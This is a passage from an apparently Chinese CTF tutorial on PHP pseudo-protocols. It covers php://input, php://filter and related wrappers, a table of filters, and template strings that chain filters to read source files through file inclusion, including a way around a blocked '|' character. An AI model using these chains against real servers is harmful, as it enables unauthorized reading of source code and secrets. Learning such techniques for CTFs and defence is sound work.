streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。 协议 作用 php://input 可以访问请求的原始数据的只读流，在POST请求中访问POST的data部分，在enctype=\"multipart/form-data\" 的时候php://input 是无效的。 php://output 只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。 php://fd (&gt;=5.3.6)允许直接访问指定的文件描述符。例如 php://fd/3 引用了文件描述符 3。 php://memory php://temp (&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 php://memory 总是把数据储存在内存中，而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。临时文件位置的决定和 sys_get_temp_dir() 的方式一致。 php://filter (&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。 1.php://filterphp://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 对于php://来说，是支持多种过滤器嵌套的 php://filter/[read|write]=[过滤器1]|[过滤器2]/resource=文件名称（包含后缀名） #如果|被过滤掉了，可以使用多过滤器: php://filter/string.rot13/resource=php://filter/convert.base64-encode/resource=文件名称（包含后缀名） 嵌套过程的执行流程为从左到右 其实是可以简写成这样的php://filter/[过滤器] ，php会自己进行识别。 过滤器列表: 过滤器名称 说明 类别 版本 string.rot13 rot13转换 字符串过滤器 PHP&gt;4.3.0 string.toupper、string.tolower 大小写互转 字符串过滤器 PHP&gt;5.0.0 convert.base64-encode、convert.base64-decode base64编码转换 转换过滤器 PHP&gt;5.0.0 convert.quoted-printable-encode、convert.quoted-printable-decode URL编码转换 转换过滤器 PHP&gt;5.0.0 convert.iconv.编码1.编码2 任意编码转换 转换过滤器 PHP&gt;5.0.0 zlib.deflate、zlib.inflate zlib压缩 压缩过滤器 PHP&gt;5.1.0 bzip2.compress、bzip2.decompress zlib压缩 压缩过滤器 PHP&gt;5.1.0 6.PHP伪协议常用函数file_get_contents() file_put_contents() readfile() fopen() file() show_source() highlight_file() 五、参考链接 https://blog.csdn.net/qq_42181428/article/details/87090539 https://blog.csdn.net/bmth666/article/details/104616201 https://www.anquanke.com/post/id/231407#h3-6 https://www.cnblogs.com/jzking121/p/15144416.html https://blog.csdn.net/qq_42181428/article/details/87090539?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_ecpm_v1~rank_aggregation-2-87090539.pc_agg_rank_aggregation&amp;utm_term=ctf+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E&amp;spm=1000.2123.3001.4430 https://segmentfault.com/a/1190000018991087","categories":[],"tags":[]}],"categories":[],"tags":[]}